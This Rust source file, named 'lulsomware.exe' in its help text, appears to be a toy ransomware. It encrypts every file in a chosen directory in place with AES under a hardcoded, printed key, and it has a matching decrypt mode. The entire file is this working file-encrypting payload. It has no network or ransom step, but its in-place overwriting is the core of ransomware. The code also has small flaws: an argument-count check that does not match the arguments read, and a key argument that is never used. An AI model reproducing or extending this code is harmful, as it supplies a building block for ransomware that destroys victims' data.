extern crate bincode_aes;

use std::fs::{read_dir, OpenOptions, File};
use std::io::{Read, Write, Seek, SeekFrom};
use std::env;
use std::error::Error;
use bincode_aes::BincodeCryptor;
use std::process::exit;


fn main() {
    let human_readable_encryption_key = "abcdefghijklmnopqrstuvwxyz012345";
    let key = bincode_aes::create_key(human_readable_encryption_key.as_bytes().to_vec()).unwrap();
    let crypt = bincode_aes::with_key(key);
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        exit_with_help();
    }

    println!("Using key: {}", human_readable_encryption_key);

    // TODO: test with non-text files (images, binaries, etc)
    // TODO: allow specifying an encryption key, and default to a random one
    let action = args[1].as_str();
    let working_directory = args[2].as_str();
    let directory_entries = read_dir(working_directory).expect("Can't read");

    println!("{} -> {}", action, working_directory);
    for entry in directory_entries {
        let path = entry.unwrap().path();
        let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
        print!("> {:?}", path.as_os_str());

        if action == "encrypt" {
            encrypt_file(&crypt, &mut file);
        } else if action == "decrypt" {
            decrypt_file(&crypt, &mut file);
        }

        println!();
    }
}

fn encrypt_file(crypt: &BincodeCryptor, original_file: &mut File) {
    let mut buffer = vec![];
    original_file.read_to_end(&mut buffer).unwrap();

    match crypt.serialize(&buffer) {
        Ok(encrypted) => {
            original_file.set_len(0).unwrap();
            original_file.seek(SeekFrom::Start(0)).unwrap();
            original_file.write_all(encrypted.as_slice()).unwrap();
            print!(" ...done!");
        }
        Err(e) => eprintln!("Can't encrypt file, skipping. Error: {:?}", e),
    }
}

fn decrypt_file(crypt: &BincodeCryptor, encrypted_file: &mut File) {
    let mut buffer = vec![];
    encrypted_file.read_to_end(&mut buffer).unwrap();

    let decrypted: Result<String, Box<dyn Error>> = crypt.deserialize(&mut buffer);
    match decrypted {
        Ok(original_content) => {
            encrypted_file.set_len(0).unwrap();
            encrypted_file.seek(SeekFrom::Start(0)).unwrap();
            encrypted_file.write_all(&mut original_content.as_bytes()).unwrap();
            print!(" ... done!")
        }
        Err(e) => eprintln!("Can't decrypt file, skipping. Error: {:?}", e),
    }
}

fn exit_with_help() {
    println!("Encrypt: lulsomware.exe encrypt [directory]");
    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
    exit(1);
}


